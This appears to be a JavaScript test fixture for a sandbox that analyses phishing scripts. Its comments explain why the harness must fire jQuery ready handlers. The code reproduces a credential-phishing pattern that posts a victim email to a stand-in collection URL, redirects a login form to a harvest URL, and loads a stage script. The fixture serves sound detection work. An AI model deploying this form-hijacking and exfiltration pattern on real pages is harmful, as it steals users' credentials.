// Synthesized (NOT sample-derived) reproduction of the dominant jQuery-based
// credential-phishing staging pattern: the entire payload is wrapped in
// $(document).ready(function () { ... }).
//
// In a browser jQuery is loaded by an earlier <script src="code.jquery.com/...">
// tag, so `$` exists. The sandbox does not load jQuery, so if `$` is not defined
// the top-level $(document)... call throws "ReferenceError: $ is not defined"
// and the run dies with ZERO events captured -- the real failure this fixture
// pins. Even once `$` is defined, a plain recorder would only RECORD the
// .ready() call and never invoke the handler, so the payload would still vanish
// silently. The harness must fire the ready handler after the main script, the
// same way it fires addEventListener('DOMContentLoaded') listeners.
//
// The handler is registered BEFORE `_stage` is defined, pinning that the
// handler fires after the main script completes rather than at registration.
$(document).ready(function () {
  $.post("https://example.com/jquery-collect", { u: "victim@example.com" });
  $("#login-form").attr("action", "https://example.com/jquery-harvest");
  window.location.href = _stage;
});

var _stage = "https://example.com/jquery-ready-stage.js";
